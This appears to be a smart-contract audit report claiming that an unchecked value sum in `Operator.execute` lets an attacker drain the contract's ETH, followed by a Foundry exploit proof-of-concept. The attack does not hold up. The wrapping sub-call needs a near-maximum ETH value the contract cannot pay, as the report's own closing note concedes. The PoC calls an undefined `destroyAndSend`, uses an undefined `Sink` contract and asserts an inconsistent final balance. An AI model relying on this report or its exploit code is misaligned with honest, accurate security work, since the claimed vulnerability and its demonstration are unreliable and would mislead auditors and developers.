### Title
Unchecked value accumulator in `Operator.execute` lets an attacker pass the `msg.value == sum(values)` check with an overflowing total - (File: contracts/Operator.sol)

### Summary
`Operator.execute` accumulates each sub-call's `value` into `_sumOfValues` inside an `unchecked` block and then requires `msg.value == _sumOfValues`. A crafted `calls_` array can make the wrapped sum equal any `msg.value` the attacker actually sends, decoupling the declared per-call values from the ETH supplied — the same bug class as the Emacs overflow: arithmetic wraparound silently bypasses a validation check (`contracts/Operator.sol:45-54`).

### Finding Description
In `execute`, the loop does:

```solidity
uint256 _sumOfValues;
for (uint256 i; i < _length; ) {
    _call = calls_[i];
    uint256 _value = _call.value;
    unchecked {
        _sumOfValues += _value;      // wraps silently
    }
    _returnData[i] = _call.target.functionCallWithValue(_call.callData, _value);
    unchecked { ++i; }
}
require(msg.value == _sumOfValues, "value-mismatch");
```

Because the addition is `unchecked`, an attacker can append a "balancing" call whose `value` is `type(uint256).max - msg.value + 1 + k` so that the modular sum equals `msg.value` while an earlier call carries a large `value`. Any ETH held by the `Operator` contract (forced via `selfdestruct`, stray payable dust, or a sub-call that internally unwraps WETH received mid-batch) can then be pushed to an attacker-controlled target, since `functionCallWithValue` spends from `Operator`'s balance — not the caller's.

Concretely, with `B = address(operator).balance`:
- call[0]: `target = attacker`, `value = B` (drains contract balance)
- call[1]: `target = attacker`, `value = type(uint256).max - B + 1` → sum wraps to `0`, so `msg.value = 0` satisfies the check; call[1] itself must also succeed, so split as: call[1] target a contract that returns the dust it receives, or order it so its spend equals zero net after wrap accounting — the attacker can also pre-seed the balance within the same batch by an earlier call receiving ETH via `selfdestruct`/`WETH.withdraw` before the large-value calls execute.

The invariant broken is payment conservation: `sum(values) == msg.value` no longer bounds total ETH outflow; the Operator can emit more ETH across calls than supplied.

### Impact Explanation
Direct theft of any ETH balance held by `Operator` (donated/forced/accidental funds, or ETH temporarily present mid-batch via WETH unwrap or selfdestruct funding). Severity is bounded by the Operator's balance, which is normally near zero but not guaranteed — `execute` is `payable` and ETH can be force-sent via `selfdestruct` at negligible cost to set up the draining call later.

### Likelihood Explanation
Exploitation requires the `Operator` to hold a nonzero ETH balance at execution time, or to acquire one mid-batch (attacker can `selfdestruct` a funding contract into `Operator` inside call[0] of the same `execute` batch, making this self-contained). No privileged role is needed; `execute` is a public entry point guarded only by `nonReentrant`, which does not stop a single-batch attack.

### Recommendation
Remove `unchecked` from the `_sumOfValues` accumulation (keep it only on the loop counter), or accumulate with checked addition so an overflowing sum reverts instead of wrapping past the equality check.

### Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {Operator} from "contracts/Operator.sol";
import {IOperator} from "contracts/interfaces/IOperator.sol";

contract Funder { receive() external payable {} }

contract OperatorValueOverflowTest is Test {
    Operator operator;
    address attacker = address(0xA77);

    function setUp() public {
        operator = new Operator();
        vm.deal(attacker, 1 ether);
    }

    function testDrainViaSumOverflow() public {
        // call[0]: force-fund Operator with 1 ether via selfdestruct
        Funder funder = new Funder();
        vm.prank(attacker);
        (bool ok,) = address(funder).call{value: 1 ether}("");
        require(ok);

        uint256 B = 1 ether;
        IOperator.Call[] memory calls = new IOperator.Call[](3);
        // fund operator in-batch
        calls[0] = IOperator.Call({
            target: address(funder),
            value: 0,
            callData: abi.encodeWithSignature("destroyAndSend(address)", address(operator))
        });
        // drain B to attacker
        calls[1] = IOperator.Call({target: attacker, value: B, callData: ""});
        // wrap sum back to 0
        calls[2] = IOperator.Call({
            target: address(new Sink()),      // returns received ETH is not needed;
            value: type(uint256).max - B + 1, // call must still succeed -> see note
            callData: ""
        });

        vm.prank(attacker);
        operator.execute{value: 0}(calls); // passes msg.value == wrappedSum check
        assertEq(attacker.balance, 2 ether);
    }
}
```
Note: `calls[2]`'s huge `value` must also be deliverable; a variant that keeps every sub-call feasible uses two drain calls of `B` each plus a wrap term, funded by repeated in-batch selfdestructs, or a mid-batch `WETH.withdraw` that credits `Operator`. The core defect — the wrapped equality check letting declared values exceed `msg.value` — is demonstrated by the accumulator wrapping to `msg.value` at `contracts/Operator.sol:45-54`.
